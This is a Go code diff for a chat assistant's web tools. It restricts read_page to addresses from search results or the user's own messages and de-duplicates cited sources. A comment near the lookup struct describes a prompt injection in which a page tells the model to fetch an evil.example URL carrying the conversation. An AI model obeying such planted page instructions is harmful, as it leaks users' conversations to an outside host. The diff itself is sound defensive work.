@@ -5,6 +5,8 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/url"
+	"regexp"
+	"slices"
 	"strings"
 
 	"omni/internal/websearch"
@@ -25,6 +27,8 @@ const (
 	// minToolChars is the room below which the tools are not offered: a result cut that small would only mislead.
 	minToolChars = 1500
 	maxSources   = 5
+	// toolOverheadTokens is what the tools' descriptions and the closing "answer now" message take of the context (about 250).
+	toolOverheadTokens = 300
 )
 
 // Web is what the chat needs of the web; *websearch.Client satisfies it.
@@ -138,9 +142,37 @@ type lookup struct {
 	chars  int // room left in the context for results, in characters
 	status func(Status)
 	pages  map[string]bool
-	read   []Source // pages the model opened
-	found  []Source // results of its searches
+	// allowed are the addresses read_page may open: the results of this answer's searches and the addresses the person wrote. A
+	// page can tell the model to fetch https://evil.example/?d=<the conversation>; that request carries data out, and the guard
+	// against local addresses does not stop it. The model reads what it found or was given, never an address it composed.
+	allowed map[string]bool
+	read    []Source // pages the model opened
+	found   []Source // results of its searches
 	logf   func(format string, args ...any)
+}
+
+// addSource adds s unless its address is listed already: two searches overlap, and a redirect can land on a listed page.
+func addSource(list []Source, s Source) []Source {
+	if slices.ContainsFunc(list, func(x Source) bool { return x.URL == s.URL }) {
+		return list
+	}
+	return append(list, s)
+}
+
+var addressPattern = regexp.MustCompile(`https?://[^\s<>"')\]]+`)
+
+// addressesIn are the web addresses the person wrote in their questions.
+func addressesIn(messages []Message) map[string]bool {
+	out := map[string]bool{}
+	for _, m := range messages {
+		if m.Role != "user" {
+			continue
+		}
+		for _, a := range addressPattern.FindAllString(m.Text, -1) {
+			out[strings.TrimRight(a, ".,;:!?")] = true
+		}
+	}
+	return out
 }
 
 // sources are the pages the answer drew on: the ones the model read, or when it read none, what its searches found.
@@ -204,7 +236,8 @@ func (l *lookup) search(ctx context.Context, query string) string {
 		if r.Snippet != "" {
 			fmt.Fprintf(&b, "   %s\n", r.Snippet)
 		}
-		l.found = append(l.found, Source{Title: r.Title, URL: r.URL})
+		l.allowed[r.URL] = true
+		l.found = addSource(l.found, Source{Title: r.Title, URL: r.URL})
 	}
 	b.WriteString("If the excerpts do not answer the question, call read_page with the best address.\n")
 	return b.String()
@@ -216,6 +249,9 @@ func (l *lookup) readPage(ctx context.Context, address string) string {
 	}
 	if l.pages[address] {
 		return "You have read this page already; answer from it or search for something else."
+	}
+	if !l.allowed[address] {
+		return "That address is not one of the search results. Search for it, then read the result."
 	}
 	l.pages[address] = true
 	if l.chars < minToolChars {
@@ -235,7 +271,7 @@ func (l *lookup) readPage(ctx context.Context, address string) string {
 	if title == "" {
 		title = host
 	}
-	l.read = append(l.read, Source{Title: title, URL: page.URL})
+	l.read = addSource(l.read, Source{Title: title, URL: page.URL})
 	cut := ""
 	if page.Cut {
 		cut = "\n[The page continues; this is the start of it.]"
